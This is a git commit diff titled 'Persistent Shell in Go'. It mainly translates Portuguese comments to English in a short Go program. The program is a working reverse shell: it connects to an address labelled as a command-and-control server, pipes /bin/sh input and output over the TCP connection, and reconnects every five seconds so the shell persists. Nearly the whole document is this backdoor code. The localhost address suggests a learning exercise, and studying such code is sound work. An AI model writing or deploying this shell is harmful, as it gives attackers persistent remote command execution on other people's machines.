af6d6851b48afab02ea1aeb298f946a58274b8fd
Luiz Fernando <fernandinho.manon@gmail.com>
2026-02-04 20:13:54 -0300

    Initial commit: Persistent Shell in Go

--- main.go
+++ main.go
@@ -7,28 +7,32 @@ import (
 )
 
 func main() {
+	// The C2 (Command & Control) server address
 	target := "127.0.0.1:4444"
 
 	for {
-		// Tenta conectar
+		// Attemp to establish a connection with the target
 		conn, err := net.Dial("tcp", target)
 
 		if err != nil {
-			// Se falhar, espera 5 segundos e tenta o loop de novo
+			// If connection fails, wait 5 seconds before retrying (Persistence)
 			time.Sleep(5 * time.Second)
 			continue
 		}
 
-		// Se conectar, executa o shell
+		// Once connected, spawn the sell process
+		// In Linux, we use /bin/sh or /bin/bash
 		cmd := exec.Command("/bin/sh")
+
+		// Redirect Standard Streams (Input, Output, and Error) to the network connection
 		cmd.Stdin = conn
 		cmd.Stdout = conn
 		cmd.Stderr = conn
 
-		// O código fica "preso" aqui enquanto a conexão durar
+		// Execute the command and block execution until the session is closed
 		cmd.Run()
 
-		// Se a conexão cair, ele sai do cmd.Run() e volta para o início do for
+		// Ensure the connection is closed before attempting to reconnect
 		conn.Close()
 	}
 }
